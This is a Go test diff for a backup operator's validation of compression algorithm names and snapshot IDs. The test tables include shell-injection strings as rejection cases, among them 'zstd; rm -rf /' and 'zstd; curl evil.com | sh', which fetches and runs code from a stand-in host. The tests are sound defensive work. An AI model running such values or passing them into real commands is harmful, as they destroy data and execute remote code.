@@ -689,6 +689,71 @@ func TestValidateS3Field(t *testing.T) {
 	}
 }
 
+func TestValidateCompressionAlgorithm(t *testing.T) {
+	tests := []struct {
+		name      string
+		algorithm string
+		expectErr bool
+	}{
+		// Valid algorithms.
+		{name: "empty (default)", algorithm: "", expectErr: false},
+		{name: "none", algorithm: "none", expectErr: false},
+		{name: "zstd", algorithm: "zstd", expectErr: false},
+		{name: "zstd-fastest", algorithm: "zstd-fastest", expectErr: false},
+		{name: "zstd-better-compression", algorithm: "zstd-better-compression", expectErr: false},
+		{name: "s2-default", algorithm: "s2-default", expectErr: false},
+		{name: "s2-better", algorithm: "s2-better", expectErr: false},
+		{name: "s2-parallel-4", algorithm: "s2-parallel-4", expectErr: false},
+		{name: "s2-parallel-8", algorithm: "s2-parallel-8", expectErr: false},
+		{name: "gzip", algorithm: "gzip", expectErr: false},
+		{name: "gzip-best-speed", algorithm: "gzip-best-speed", expectErr: false},
+		{name: "gzip-best-compression", algorithm: "gzip-best-compression", expectErr: false},
+		{name: "pgzip", algorithm: "pgzip", expectErr: false},
+		{name: "pgzip-best-speed", algorithm: "pgzip-best-speed", expectErr: false},
+		{name: "pgzip-best-compression", algorithm: "pgzip-best-compression", expectErr: false},
+		{name: "deflate-default", algorithm: "deflate-default", expectErr: false},
+		{name: "deflate-best-speed", algorithm: "deflate-best-speed", expectErr: false},
+		{name: "deflate-best-compression", algorithm: "deflate-best-compression", expectErr: false},
+		{name: "lz4", algorithm: "lz4", expectErr: false},
+		// Invalid / injection attempts.
+		{name: "unknown algorithm", algorithm: "brotli", expectErr: true},
+		{name: "semicolon injection", algorithm: "zstd; rm -rf /", expectErr: true},
+		{name: "pipe injection", algorithm: "zstd|evil", expectErr: true},
+		{name: "ampersand injection", algorithm: "zstd&&evil", expectErr: true},
+		{name: "dollar injection", algorithm: "$(evil)", expectErr: true},
+		{name: "backtick injection", algorithm: "`evil`", expectErr: true},
+		{name: "newline injection", algorithm: "zstd\nevil", expectErr: true},
+		{name: "space injection", algorithm: "zstd evil", expectErr: true},
+		{name: "uppercase", algorithm: "ZSTD", expectErr: true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateCompressionAlgorithm(tt.algorithm)
+			if tt.expectErr && err == nil {
+				t.Error("expected error, got nil")
+			}
+			if !tt.expectErr && err != nil {
+				t.Errorf("unexpected error: %v", err)
+			}
+		})
+	}
+}
+
+func TestBuildBackupPodRejectsInvalidCompression(t *testing.T) {
+	op := newTestOperation(drv1alpha1.OperationTypeBackup, "")
+	repo := newTestBackupRepo()
+	cfg := DefaultKopiaPodConfig()
+	cfg.CompressionAlgorithm = "zstd; curl evil.com | sh"
+
+	_, err := BuildBackupPod(op, repo, cfg)
+	if err == nil {
+		t.Fatal("expected error for shell injection in compression algorithm")
+	}
+	if !strings.Contains(err.Error(), "invalid backup config") {
+		t.Errorf("expected 'invalid backup config' in error, got: %v", err)
+	}
+}
+
 func TestBuildRestorePodRejectsInvalidSnapshotID(t *testing.T) {
 	op := newTestOperation(drv1alpha1.OperationTypeRestore, "; rm -rf /")
 	repo := newTestBackupRepo()
